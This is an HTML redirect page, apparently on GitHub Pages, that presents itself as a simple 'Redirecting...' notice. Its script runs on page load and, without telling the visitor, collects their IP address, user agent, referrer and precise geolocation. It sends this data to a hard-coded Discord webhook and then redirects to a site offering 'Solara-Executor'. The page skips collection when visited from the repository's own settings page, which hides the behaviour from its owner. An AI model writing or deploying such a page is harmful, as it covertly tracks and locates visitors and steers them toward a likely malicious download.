<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NTTP5YDYL7"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-NTTP5YDYL7');
    </script>
    <!-- End Google Analytics -->

    <!-- Data Collection Script -->
    <script>
        function getUserAgent() {
            return navigator.userAgent;
        }

        function getReferrer() {
            return document.referrer;
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                console.log('IP Address:', data.ip); // Debug log
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        console.log('Geolocation:', position.coords); // Debug log
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    }, reject);
                } else {
                    console.log('Geolocation not available.'); // Debug log
                    resolve(null);
                }
            });
        }

        async function collectAndSendData() {
            const userAgent = getUserAgent();
            console.log('User-Agent:', userAgent); // Debug log

            const referrer = getReferrer();
            console.log('Referrer:', referrer); // Debug log

            const ipAddress = await getIPAddress();

            const geolocation = await getGeolocation();

            const data = {
                "User-Agent": userAgent,
                "Referrer": referrer,
                "IP Address": ipAddress,
                "Geolocation": geolocation ? `Lat: ${geolocation.latitude}, Long: ${geolocation.longitude}` : "Not Available"
            };

            console.log('Sending data to Discord:', data); // Debug log
            sendDataToDiscord(data);
        }

        function sendDataToDiscord(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC';

            const xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log('Data sent successfully!'); // Success log
                } else if (xhr.readyState === 4) {
                    console.error('Error sending data:', xhr.statusText); // Error log
                }
            };
            xhr.send(JSON.stringify({
                content: `Collected Data:\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``
            }));
        }

        function shouldRedirect() {
            const referrer = getReferrer();
            const blockReferrer = 'https://github.com/RebornPhantom/Repository/settings/pages';
            return referrer !== blockReferrer;
        }

        if (shouldRedirect()) {
            collectAndSendData();
            setTimeout(() => {
                window.location.href = 'https://lkfms.pro/Solara-Executor';
            }, 100);
        } else {
            console.log('Redirect blocked due to referrer.');
        }
    </script>
</head>
<body>
    <p>If you are not redirected, <a href="https://bit.ly/Solara-Executor">click here</a>.</p>
</body>
</html>
